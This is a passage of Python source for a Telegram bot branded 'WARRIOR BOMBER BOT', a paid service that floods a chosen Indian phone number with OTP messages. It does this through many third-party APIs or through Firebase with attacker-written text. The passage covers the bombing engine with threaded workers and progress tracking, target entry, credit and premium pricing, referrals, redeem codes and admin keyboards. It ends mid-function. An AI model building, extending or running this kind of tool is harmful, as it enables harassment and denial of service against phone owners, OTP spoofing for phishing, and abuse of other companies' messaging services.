def _recently_verified(uid):
    with _join_lock:
        t = _join_cache.get(uid)
        return bool(t and (time.time() - t) < 300)

def _mark_verified(uid):
    with _join_lock: _join_cache[uid] = time.time()

async def check_force_join(context, uid):
    if has_admin_access(uid): return True
    if _recently_verified(uid): return True
    channels = get_force_channels()
    if not channels: return True
    for ch in channels:
        try:
            m = await context.bot.get_chat_member(chat_id=ch["id"], user_id=uid)
            if m.status not in ("creator", "administrator", "member"): return False
        except Exception: return False
    _mark_verified(uid); return True

def join_keyboard():
    btns = []
    for ch in get_force_channels():
        if ch.get("url"):
            btns.append([InlineKeyboardButton(f"📢 JOIN {ch['label']}", url=ch["url"],
                                              api_kwargs={"style": "primary"})])
    btns.append([InlineKeyboardButton("✅ VERIFY", callback_data="join_check",
                                      api_kwargs={"style": "success"})])
    return InlineKeyboardMarkup(btns)

async def prompt_join(msg):
    txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
           "   🔐 ᴄʜᴀɴɴᴇʟ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ\n"
           "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
           "Join our official channel first.\n\n"
           "1. Click 📢 JOIN\n"
           "2. Join\n"
           "3. Come back and click ✅ VERIFY\n\n"
           "━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    kb = join_keyboard()
    if hasattr(msg, "edit_message_text"):
        try: await msg.edit_message_text(txt, reply_markup=kb); return
        except Exception: pass
    try: await msg.reply_text(txt, reply_markup=kb)
    except Exception: pass

# ===================== WELCOME =====================
def welcome_text(uid):
    u = get_user(uid)
    if not u: create_user(uid); u = get_user(uid)
    check_free_refill(uid); u = get_user(uid)
    
    if is_owner(uid): plan = "ᴏᴡɴᴇʀ"
    elif is_admin(uid): plan = "ᴀᴅᴍɪɴ"
    elif is_premium_active(uid): plan = "ᴘʀᴇᴍɪᴜᴍ"
    else: plan = "ꜰʀᴇᴇ"
    
    name = u.get("first_name") or "ᴜsᴇʀ"
    
    if has_admin_access(uid) or is_premium_active(uid):
        used_txt = "∞"; left_txt = "∞"; refill_txt = "∞"
    else:
        used = u.get("free_attacks_used", 0)
        left = max(0, FREE_ATTACKS - used)
        used_txt = f"{used}/{FREE_ATTACKS}"
        left_txt = str(left)
        refill_txt = get_refill_countdown(uid)
    
    credits = u.get("credits", 0)
    premium_info = ""
    if is_premium_active(uid) and not has_admin_access(uid):
        exp = u.get("premium_expires_at", 0) or 0
        if exp > 0:
            rem = int(exp - time.time())
            d = rem // 86400; h = (rem % 86400) // 3600
            premium_info = f"\n💎 ᴠᴀʟɪᴅ: {d}ᴅ {h}ʜ ʟᴇꜰᴛ"
    
    return (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   🤖 {sc('WARRIOR BOMBER BOT')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👋 {sc('Welcome')}, {name}\n"
        f"🆔 {sc('User ID')}: `{uid}`\n\n"
        f"💎 {sc('Plan')}: {plan}\n"
        f"⚡ {sc('Status')}: 🟢 {sc('Active')}"
        f"{premium_info}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   🎯 {sc('ATTACKS')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚔️ {sc('Used')}: {used_txt}\n"
        f"✅ {sc('Left')}: {left_txt}\n"
        f"⏱️ {sc('Refill in')}: {refill_txt}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   💰 {sc('CREDITS')}: {credits}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👑 {sc('By Warrior X Technical White Hat')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

def user_main_kb(uid):
    kb = [
        [InlineKeyboardButton("🔥  START BOMBING", callback_data="bomb:start",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("💳  Recharge", callback_data="user:recharge",
                              api_kwargs={"style": "primary"}),
         InlineKeyboardButton("🎁  Redeem", callback_data="user:redeem",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("🔗  Refer", callback_data="user:refer",
                              api_kwargs={"style": "primary"}),
         InlineKeyboardButton("📜  History", callback_data="user:history",
                              api_kwargs={"style": "primary"})],
        [InlineKeyboardButton("🛡️  Status", callback_data="user:system",
                              api_kwargs={"style": "primary"}),
         InlineKeyboardButton("👨‍💻  Support", url=SUPPORT_LINK,
                              api_kwargs={"style": "primary"})],
    ]
    if has_admin_access(uid):
        kb.append([InlineKeyboardButton("🔐  Admin Panel", callback_data="adm:main",
                                        api_kwargs={"style": "danger"})])
    return InlineKeyboardMarkup(kb)

async def send_main_menu(context, chat_id, uid):
    await safe_send(context.bot, chat_id, welcome_text(uid),
                    reply_markup=user_main_kb(uid), parse_mode="Markdown")
# ===================== BOMBING ENGINE =====================
async def start_bombing(uid, target, context, mode):
    chat_id = uid
    
    # Deduct attack or credit
    ok, reason = deduct_attack_or_credit(uid)
    if not ok:
        u = get_user(uid)
        free_used = u.get("free_attacks_used", 0)
        credits = u.get("credits", 0)
        await safe_send(context.bot, chat_id,
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "   ❌ ɴᴏ ᴀᴛᴛᴀᴄᴋs ʟᴇꜰᴛ\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "You've used all free attacks\n"
            "and have no credits.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "   📊 sᴛᴀᴛᴜs\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚔️ Free attacks\n"
            f"   ᴜsᴇᴅ: {free_used}/{FREE_ATTACKS}\n"
            f"   ʟᴇꜰᴛ: 0\n"
            f"   ⏱️ ʀᴇꜰɪʟʟ ɪɴ: {get_refill_countdown(uid)}\n\n"
            f"💰 ᴄʀᴇᴅɪᴛs: {credits}\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💡 Buy credits to continue instantly\n"
            "   or wait for refill.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💳 BUY CREDITS", callback_data="user:recharge",
                                      api_kwargs={"style": "success"})],
                [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                      api_kwargs={"style": "primary"})],
            ]))
        return
    
    # Custom mode: check Firebase
    if mode == "custom" and not get_firebases():
        await safe_send(context.bot, chat_id,
            "⚠️ *No Firebase configured*\n\nContact admin.",
            parse_mode="Markdown")
        return
    
    # Init bombing
    request_counts[uid] = 0
    bombing_active[uid] = True
    u = get_user(uid) or {}
    active_bombings_detail[uid] = {
        "username": u.get("username") or "",
        "target": target,
        "started": time.time(),
        "requests": 0,
        "mode": mode,
        "max": 999999 if (has_admin_access(uid) or is_premium_active(uid)) else 500,
    }
    
    stop_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑  STOP", callback_data="bomb:stop",
                              api_kwargs={"style": "danger"})]
    ])
    
    title = "ʀᴀɴᴅᴏᴍ ᴏᴛᴘ" if mode == "random" else "ᴄᴜꜱᴛᴏᴍ"
    
    try:
        progress_msg = await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"   💣 {sc('BOMBING')} — {title}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📱 +91{target}\n\n"
                f"░░░░░░░░░░░░░░░░░░░░ 0%\n\n"
                f"🟢 {sc('Status')}: {sc('Active')}\n"
                f"📨 {sc('Sent')}: 0\n"
                f"⚡ {sc('Speed')}: 0/sec\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            ),
            reply_markup=stop_kb,
            parse_mode="Markdown"
        )
    except Exception as e:
        log.error(f"progress msg fail: {e}")
        return
    
    # Launch workers
    if mode == "random":
        for _ in range(THREAD_COUNT):
            _global_executor.submit(random_otp_worker, uid, target)
    else:
        message = context.user_data.get("custom_message", "Your code is {otp}")
        for _ in range(THREAD_COUNT):
            _global_executor.submit(firebase_custom_worker, uid, target, message, 500)
    
    bombing_threads[str(uid)] = []
    
    # Progress update loop
    last_update = 0
    last_pct = -1
    
    try:
        while bombing_active.get(uid):
            await asyncio.sleep(1)
            cur = request_counts.get(uid, 0)
            info = active_bombings_detail.get(uid, {})
            runtime = max(1, int(time.time() - info.get("started", time.time())))
            speed = cur // runtime
            
            # Simple % (max 100 for display)
            pct = min(int((cur / 500) * 100), 100) if cur < 500 else 100
            # Alternative: continuous rolling bar
            if cur >= 500:
                pct = 100
            
            now = time.time()
            if now - last_update >= STATUS_UPDATE_INTERVAL:
                last_update = now
                filled = int(pct / 5)
                bar = "█" * filled + "░" * (20 - filled)
                
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=progress_msg.message_id,
                        text=(
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"   💣 {sc('BOMBING')} — {title}\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📱 +91{target}\n\n"
                            f"{bar} {pct}%\n\n"
                            f"🟢 {sc('Status')}: {sc('Active')}\n"
                            f"📨 {sc('Sent')}: {cur}\n"
                            f"⚡ {sc('Speed')}: {speed}/sec\n"
                            f"⏱️ {sc('Time')}: {runtime}s\n\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                        ),
                        reply_markup=stop_kb,
                        parse_mode="Markdown"
                    )
                except Exception as e:
                    err = str(e).lower()
                    if "not modified" not in err:
                        log.warning(f"progress edit: {e}")
    except Exception as e:
        log.error(f"bomb loop: {e}")
    finally:
        bombing_active[uid] = False
        info = active_bombings_detail.get(uid, {})
        runtime = int(time.time() - info.get("started", time.time()))
        final = request_counts.pop(uid, 0)
        active_bombings_detail.pop(uid, None)
        bombing_threads.pop(str(uid), None)
        
        log_activity(uid, "Bombing", f"{mode} on {target} — {final} req in {runtime}s")
        
        # Final message
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=progress_msg.message_id,
                text=(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   ✅ {sc('COMPLETED')}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📱 +91{target}\n\n"
                    f"████████████████████ 100%\n\n"
                    f"📨 {sc('Total')}: {final}\n"
                    f"⏱️ {sc('Runtime')}: {runtime}s\n"
                    f"⚡ {sc('Avg Speed')}: {final // max(runtime, 1)}/sec\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                ),
                parse_mode="Markdown"
            )
        except Exception: pass
        
        # Auto back to menu
        await asyncio.sleep(2)
        try:
            await send_main_menu(context, chat_id, uid)
        except Exception: pass
# ===================== USER HANDLERS =====================
async def start(update, context):
    async with _user_semaphore:
        try:
            u = update.effective_user
            uid = u.id
            if is_banned(uid):
                await update.message.reply_text(
                    f"🚫 *ACCESS DENIED*\n\nYou are banned.\n\n"
                    f"📌 Contact: {SUPPORT_USERNAME}",
                    parse_mode="Markdown")
                return
            
            create_user(uid, u.username or "", u.first_name or "")
            check_free_refill(uid)
            
            # Maintenance
            if get_config("maintenance", "0") == "1" and not has_admin_access(uid):
                await update.message.reply_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   🛠️ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Bot is currently under maintenance.\n\n"
                    "⏱️ We'll be back soon!\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📢 {CHANNEL_USERNAME}\n"
                    f"💬 {SUPPORT_USERNAME}\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown")
                return
            
            # Referral
            if context.args and context.args[0].startswith("ref_"):
                try:
                    ref_id = int(context.args[0][4:])
                    if ref_id != uid:
                        ref_user = get_user(ref_id)
                        me = get_user(uid)
                        if ref_user and me and not me.get("referrer_id"):
                            update_user(ref_id,
                                credits=ref_user.get("credits", 0) + 5,
                                referral_count=ref_user.get("referral_count", 0) + 1)
                            update_user(uid, referrer_id=ref_id)
                            try:
                                await context.bot.send_message(ref_id,
                                    f"🎉 *REFERRAL SUCCESS*\n\n"
                                    f"👤 @{u.username or uid} joined!\n"
                                    f"💰 +5 Credits added",
                                    parse_mode="Markdown")
                            except Exception: pass
                except Exception: pass
            
            # Force join
            if not await check_force_join(context, uid):
                await prompt_join(update.message)
                return
            
            await send_main_menu(context, update.message.chat_id, uid)
        except Exception as e:
            log.error(f"start error: {e}")

async def join_callback(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if q.data == "join_check":
        _join_cache.pop(uid, None)
        if await check_force_join(context, uid):
            await q.answer("✅ Verified!", show_alert=True)
            try: await q.edit_message_text("✅ VERIFIED", parse_mode="Markdown")
            except Exception: pass
            await asyncio.sleep(0.5)
            await send_main_menu(context, q.message.chat_id, uid)
        else:
            await q.answer("❌ Not joined yet!", show_alert=True)

async def cancel_cmd(update, context):
    context.user_data.clear()
    await update.message.reply_text("❌ Cancelled.")

# ===================== TEXT HANDLER (target/custom msg/redeem) =====================
async def handle_text(update, context):
    async with _user_semaphore:
        try:
            uid = update.effective_user.id
            text = (update.message.text or "").strip()
            if is_banned(uid): return
            
            # Admin input first
            if await handle_admin_input(update, context):
                return
            
            check_free_refill(uid)
            
            if not await check_force_join(context, uid):
                await prompt_join(update.message); return
            
            # ---- Redeem code input ----
            if context.user_data.get("awaiting_redeem"):
                code = text.upper()
                conn = db(); c = conn.cursor()
                c.execute("SELECT credits, max_uses, used_count FROM redeem_codes WHERE code = ?",
                          (code,))
                row = c.fetchone()
                
                if not row:
                    conn.close()
                    await update.message.reply_text(
                        "❌ *INVALID CODE*\n\nThis code doesn't exist.",
                        parse_mode="Markdown")
                    context.user_data.pop("awaiting_redeem", None)
                    return
                
                credits, max_uses, used_count = row
                
                c.execute("SELECT id FROM redeem_history WHERE code = ? AND user_id = ?",
                          (code, uid))
                if c.fetchone():
                    conn.close()
                    await update.message.reply_text(
                        "❌ *ALREADY USED*\n\nYou already used this code.",
                        parse_mode="Markdown")
                    context.user_data.pop("awaiting_redeem", None)
                    return
                
                if used_count >= max_uses:
                    conn.close()
                    await update.message.reply_text(
                        "❌ *CODE EXPIRED*\n\nMax uses reached.",
                        parse_mode="Markdown")
                    context.user_data.pop("awaiting_redeem", None)
                    return
                
                u = get_user(uid)
                new_credits = u.get("credits", 0) + credits
                c.execute("UPDATE users SET credits = ? WHERE user_id = ?", (new_credits, uid))
                c.execute("UPDATE redeem_codes SET used_count = used_count + 1 WHERE code = ?", (code,))
                c.execute("INSERT INTO redeem_history (code, user_id, credits) VALUES (?, ?, ?)",
                          (code, uid, credits))
                conn.commit(); conn.close()
                
                log_activity(uid, "Redeem", f"{code} — +{credits}")
                
                await update.message.reply_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   ✅ ᴄᴏᴅᴇ ʀᴇᴅᴇᴇᴍᴇᴅ\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🎁 Code: `{code}`\n"
                    f"💰 +{credits} Credits\n"
                    f"💰 New Balance: `{new_credits}`\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔥 START BOMBING",
                                              callback_data="bomb:start",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🏠 HOME",
                                              callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                context.user_data.pop("awaiting_redeem", None)
                return
            
            # ---- Target input ----
            if context.user_data.get("awaiting_target"):
                mode = context.user_data.get("bomb_mode")
                if text.isdigit() and len(text) == 10:
                    if is_protected(text) or is_blacklisted(text):
                        await update.message.reply_text("🛡️/⛔ Blocked number.")
                        context.user_data.clear(); return
                    context.user_data["target"] = text
                    if mode == "random":
                        context.user_data.pop("awaiting_target", None)
                        await update.message.reply_text(f"✅ Target: `{text}`\n\n⏳ Starting...",
                                                        parse_mode="Markdown")
                        asyncio.create_task(start_bombing(uid, text, context, "random"))
                    else:
                        context.user_data["awaiting_message"] = True
                        context.user_data.pop("awaiting_target", None)
                        await update.message.reply_text(
                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            "   ✏️ ᴄᴜꜱᴛᴏᴍ ᴍᴇꜱꜱᴀɢᴇ\n"
                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                            "Type your message:\n\n"
                            "💡 Use `{otp}` for random OTP\n\n"
                            "Example:\n`Your code is {otp}`\n\n"
                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                            parse_mode="Markdown")
                else:
                    await update.message.reply_text("❌ Enter valid 10-digit number.")
                return
            
            # ---- Custom message input ----
            if context.user_data.get("awaiting_message"):
                if not text: return
                target = context.user_data.get("target")
                context.user_data["custom_message"] = text
                context.user_data.pop("awaiting_message", None)
                await update.message.reply_text("✅ Message saved\n⏳ Starting...")
                asyncio.create_task(start_bombing(uid, target, context, "custom"))
                return
        except Exception as e:
            log.error(f"handle_text: {e}")

# ===================== USER CALLBACK =====================
async def user_callback(update, context):
    async with _user_semaphore:
        try:
            q = update.callback_query
            await q.answer()
            uid = q.from_user.id
            data = q.data
            if is_banned(uid):
                await q.edit_message_text("🚫 Banned."); return
            
            # ---- START BOMBING ----
            if data == "bomb:start":
                if not await check_force_join(context, uid):
                    await prompt_join(q); return
                kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔢  RANDOM OTP",
                                          callback_data="bomb_type:random",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("✏️  CUSTOM MESSAGE",
                                          callback_data="bomb_type:custom",
                                          api_kwargs={"style": "primary"})],
                    [InlineKeyboardButton("❌  CANCEL",
                                          callback_data="user:back",
                                          api_kwargs={"style": "danger"})],
                ])
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   🎯 ꜱᴇʟᴇᴄᴛ ᴛʏᴘᴇ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Choose bombing mode:\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    reply_markup=kb)
                return
            
            # ---- BOMB TYPE ----
            if data.startswith("bomb_type:"):
                mode = data.split(":")[1]
                context.user_data["bomb_mode"] = mode
                context.user_data["awaiting_target"] = True
                title = "🔢 ʀᴀɴᴅᴏᴍ ᴏᴛᴘ" if mode == "random" else "✏️ ᴄᴜꜱᴛᴏᴍ"
                info = "Auto OTP via 108 APIs" if mode == "random" else "Custom message via Firebase"
                await q.edit_message_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   {title} ʙᴏᴍʙɪɴɢ\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"Send target number:\n\n"
                    f"📱 Format: `9876543210`\n\n"
                    f"ℹ️ {info}\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("❌ CANCEL",
                                              callback_data="user:back",
                                              api_kwargs={"style": "danger"})],
                    ]))
                return
            
            # ---- STOP BOMBING ----
            if data == "bomb:stop":
                if bombing_active.get(uid):
                    bombing_active[uid] = False
                    await q.answer("🛑 Stopped", show_alert=False)
                    cur = request_counts.get(uid, 0)
                    try:
                        await q.edit_message_text(
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"   🛑 ꜱᴛᴏᴘᴘᴇᴅ\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📨 {sc('Sent')}: {cur}\n\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                            parse_mode="Markdown")
                    except Exception: pass
                    await asyncio.sleep(1.5)
                    try: await q.message.delete()
                    except Exception: pass
                    await send_main_menu(context, q.message.chat_id, uid)
                else:
                    await q.answer("No active bombing.", show_alert=True)
                return
            
            # ---- RECHARGE ----
            if data == "user:recharge":
                kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton("💳 5 Credits — ₹25",
                                          callback_data="rc:5",
                                          api_kwargs={"style": "primary"})],
                    [InlineKeyboardButton("💎 10 Credits — ₹50",
                                          callback_data="rc:10",
                                          api_kwargs={"style": "primary"})],
                    [InlineKeyboardButton("🚀 25 Credits — ₹100",
                                          callback_data="rc:25",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("👑 50 Credits — ₹200",
                                          callback_data="rc:50",
                                          api_kwargs={"style": "primary"})],
                    [InlineKeyboardButton("⚡ 1 Month Premium — ₹300",
                                          callback_data="rc:month1",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("🔥 3 Months Premium — ₹700",
                                          callback_data="rc:month3",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("🔙 BACK",
                                          callback_data="user:back",
                                          api_kwargs={"style": "danger"})],
                ])
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   💳 ᴘʟᴀɴꜱ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "💰 ᴄʀᴇᴅɪᴛꜱ (ɴᴏ ᴇxᴘɪʀʏ):\n"
                    "   • 5 Credits — ₹25\n"
                    "   • 10 Credits — ₹50\n"
                    "   • 25 Credits — ₹100\n"
                    "   • 50 Credits — ₹200\n\n"
                    "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ ᴘʟᴀɴꜱ:\n"
                    "   • 1 Month — ₹300\n"
                    "   • 3 Months — ₹700\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    reply_markup=kb)
                return
            
            if data.startswith("rc:"):
                plan = data.split(":")[1]
                plans = {
                    "5": ("5 Credits", "₹25", 5, 0),
                    "10": ("10 Credits", "₹50", 10, 0),
                    "25": ("25 Credits", "₹100", 25, 0),
                    "50": ("50 Credits", "₹200", 50, 0),
                    "month1": ("1 Month Premium", "₹300", 0, 30),
                    "month3": ("3 Months Premium", "₹700", 0, 90),
                }
                if plan not in plans: return
                name, price, credits, days = plans[plan]
                
                info = f"💰 Credits: {credits}" if credits > 0 else f"♾️ Unlimited: {days} days"
                
                await q.edit_message_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   💳 {name.upper()}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"{info}\n"
                    f"💵 Price: {price}\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📌 ᴛᴏ ᴘᴜʀᴄʜᴀꜱᴇ:\n\n"
                    f"📱 DM Support:\n   {SUPPORT_USERNAME}\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📌 ꜱᴛᴇᴘꜱ:\n"
                    f"1. Message support\n"
                    f"2. Complete payment\n"
                    f"3. Share screenshot\n"
                    f"4. Wait for approval\n"
                    f"5. Added automatically\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("📱 CONTACT SUPPORT", url=SUPPORT_LINK,
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:recharge",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            # ---- REDEEM ----
            if data == "user:redeem":
                context.user_data["awaiting_redeem"] = True
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   🎁 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Send your redeem code:\n\n"
                    "Example:\n`WARRIOR-A1B2-C3D4`\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            # ---- REFER ----
            if data == "user:refer":
                bot_username = (await context.bot.get_me()).username
                u = get_user(uid)
                link = f"https://t.me/{bot_username}?start=ref_{uid}"
                await q.edit_message_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   🔗 ʀᴇꜰᴇʀ & ᴇᴀʀɴ\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"Your Link:\n`{link}`\n\n"
                    f"📊 Referrals: `{u.get('referral_count', 0)}`\n"
                    f"💰 Earned: `{u.get('referral_count', 0) * 5}` credits\n\n"
                    f"🎁 1 Referral = 5 Credits\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("📤 SHARE",
                                              url=f"https://t.me/share/url?url={link}",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            # ---- HISTORY ----
            if data == "user:history":
                rows = get_activity(uid, 10)
                txt = "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                txt += "   📜 ʜɪꜱᴛᴏʀʏ\n"
                txt += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                if not rows: txt += "_No history yet_\n"
                for a_, d_, t_ in rows:
                    txt += f"• {a_}\n  _{d_[:40]}_\n  `{t_[:19]}`\n\n"
                txt += "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                await q.edit_message_text(txt, parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            # ---- STATUS ----
            if data == "user:system":
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   🛡️ ꜱʏꜱᴛᴇᴍ ꜱᴛᴀᴛᴜꜱ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "✅ Bot: ONLINE\n"
                    "✅ Database: ACTIVE\n"
                    "✅ Engine: ARMED\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            # ---- BACK TO HOME ----
            if data == "user:back":
                context.user_data.clear()
                await q.edit_message_text(welcome_text(uid),
                    reply_markup=user_main_kb(uid),
                    parse_mode="Markdown")
                return
        except Exception as e:
            log.error(f"user_callback: {e}")
# ===================== ADMIN PANEL — KEYBOARDS =====================
def owner_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 DASHBOARD", callback_data="adm:dashboard",
                              api_kwargs={"style": "primary"}),
         InlineKeyboardButton("🛰️ LIVE", callback_data="adm:live",
                              api_kwargs={"style": "primary"})],
        [InlineKeyboardButton("👥 USERS", callback_data="adm:users",
                              api_kwargs={"style": "primary"}),
         InlineKeyboardButton("🚫 BAN/UNBAN", callback_data="adm:ban_menu",
                              api_kwargs={"style": "danger"})],
        [InlineKeyboardButton("💎 PREMIUM", callback_data="adm:prem_menu",
                              api_kwargs={"style": "success"}),
         InlineKeyboardButton("💰 CREDITS", callback_data="adm:credits_menu",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("🎁 REDEEM CODES", callback_data="adm:redeem_menu",
                              api_kwargs={"style": "success"}),
         InlineKeyboardButton("🛰️ FIREBASES", callback_data="adm:fb_menu",
                              api_kwargs={"style": "primary"})],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="adm:bc_all",
                              api_kwargs={"style": "success"}),
         InlineKeyboardButton("📢 CHANNELS", callback_data="adm:channels_menu",
                              api_kwargs={"style": "primary"})],
        [InlineKeyboardButton("🔧 MAINTENANCE", callback_data="adm:maintenance",
                              api_kwargs={"style": "danger"})],
        [InlineKeyboardButton("🔄 REFRESH", callback_data="adm:main",
                              api_kwargs={"style": "primary"})],
    ])

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚫 BAN USER", callback_data="adm:ban_add",
                              api_kwargs={"style": "danger"})],
        [InlineKeyboardButton("✅ UNBAN USER", callback_data="adm:ban_remove",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("💰 GIVE CREDITS", callback_data="adm:give_credits",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("🎁 GENERATE REDEEM", callback_data="adm:gen_redeem",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="adm:bc_all",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("🔄 REFRESH", callback_data="adm:main",
                              api_kwargs={"style": "primary"})],
    ])

def back_kb(target="adm:main"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 BACK", callback_data=target,
                              api_kwargs={"style": "primary"})]
    ])

# ===================== ADMIN CALLBACK =====================
async def admin_callback(update, context):
